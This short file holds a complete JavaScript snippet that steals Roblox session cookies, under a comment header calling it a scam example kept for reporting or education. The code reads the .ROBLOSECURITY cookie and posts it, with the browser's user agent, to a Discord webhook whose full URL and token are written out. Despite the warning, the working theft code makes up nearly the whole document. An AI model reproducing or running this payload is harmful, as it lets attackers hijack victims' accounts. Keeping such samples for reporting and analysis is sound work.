// WARNING: This is an example of malicious code used in Roblox token scams.
// Your webhook is used here as the destination for stolen data.
// DO NOT EXECUTE THIS CODE – for reporting or educational use only.

(function () {
  if (!window.location.hostname.includes("roblox.com")) {
    alert("Please run this on the Roblox homepage");
    return;
  }

  const robloxToken = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];

  fetch("https://discordapp.com/api/webhooks/1358350972937572482/lrx4Rp5jjgJOgiD5J33eTJ5Wc1jeJtXaIWoVdgAW7fIJ1xfvm6WtIbhhBy1sPiVHZ93f", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `Token: ${robloxToken}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
    })
  });
})();
